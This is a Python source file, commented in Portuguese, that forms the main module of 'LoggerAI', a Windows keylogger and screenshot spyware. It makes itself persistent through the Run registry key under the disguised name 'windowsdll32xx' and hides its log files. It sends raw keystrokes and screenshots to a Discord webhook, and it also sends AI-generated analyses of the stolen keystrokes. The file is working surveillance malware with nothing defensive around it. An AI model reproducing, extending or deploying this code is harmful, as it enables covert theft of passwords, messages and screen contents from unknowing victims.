"""Módulo que define o fluxo de execução do programa"""

import os
import subprocess
import sys
import threading
import zipfile
from datetime import datetime
import time
import winreg
import win32con
from LoggerAI.keylogger import Keylogger
from LoggerAI.spy import Spy
from LoggerAI.agent_ai import analyze_logs
from LoggerAI.webhook_sender import WebhookSender


class Core:
    """"Classe principal, incializa o keylogger, o spy e o webhook"""

    def __init__(self):
        self.keylogger = Keylogger()
        self.spy = Spy()
        self.webhook = WebhookSender(os.getenv("DISCORD_WEBHOOK"))

    def autorun(self, exe_path):
        """"Função responsável pela persistência, insere o programa no caminho da chave de registro para incialização com o sistema"""
        try:
            if not exe_path:
                raise ValueError("The path was not found")
            key = winreg.HKEY_CURRENT_USER
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            program_name = "windowsdll32xx"
            reg_key = winreg.OpenKey(key, reg_path, 0, win32con.KEY_WRITE)
            winreg.SetValueEx(reg_key, program_name, 0,
                              win32con.REG_SZ, f'"{exe_path}"')
            winreg.CloseKey(reg_key)
        except Exception as e:
            print(f"[Autorun Error] {e}")

    def zip_files(self, txt_filename, zip_filename, content):
        """"Função para empacotar os arquivos antes de enviar"""
        try:
            with open(txt_filename, "w", encoding="utf-8") as f:
                f.write(content)
            subprocess.call(["attrib", "+h", "+s", txt_filename])

            with zipfile.ZipFile(zip_filename, "w", zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(txt_filename)
            subprocess.call(["attrib", "+h", "+s", zip_filename])
        except Exception as e:
            print(f"[Zip Error] {e}")

    def send_spy(self):
        """Função de envio das capturas de tela"""
        while True:
            try:
                zip_path = self.spy.main(duration=30, interval_seconds=1)
                self.webhook.send_file(
                    zip_path, "\n📸 Capturas de tela obtidas:"
                )
                os.remove(zip_path)
            except Exception as e:
                print(f"[Spy Error] {e}")

    def send_keylogger(self, interval=30):
        """"Função de envio dos logs capturados, envia tanto os logs brutos, quanto os analisados pela IA"""
        while True:
            try:
                logs, logs_file = self.keylogger.main(duration=interval)
                if not logs:
                    continue

                timestamp = datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
                raw_txt = f"raw_logs_{timestamp}.txt"
                raw_zip = f"raw_logs_{timestamp}.zip"
                log_text = "\n".join(logs)
                self.zip_files(raw_txt, raw_zip, log_text)
                self.webhook.send_file(raw_zip, "Logs brutos.")
                os.remove(raw_txt)
                os.remove(raw_zip)

                analysis = analyze_logs(logs)
                analyzed_txt = f"analise_logs_{timestamp}.txt"
                analyzed_zip = f"analise_logs_{timestamp}.zip"
                self.zip_files(analyzed_txt, analyzed_zip, analysis)
                self.webhook.send_file(analyzed_zip, "Logs analisados.")
                os.remove(analyzed_txt)
                os.remove(analyzed_zip)

                if os.path.exists(logs_file):
                    os.remove(logs_file)

                self.keylogger.key_log = {}

            except Exception as e:
                print(f"[Keylogger Analysis Error] {e}")

    def main(self):
        """Função main, define as threads e pega o caminho do programa para a função autorun"""
        exe_path = os.path.abspath(sys.argv[0])
        self.autorun(exe_path)

        t1 = threading.Thread(target=self.send_keylogger, args=(30,))
        t2 = threading.Thread(target=self.send_spy)
        t1.start()
        t2.start()

        while True:
            time.sleep(1)
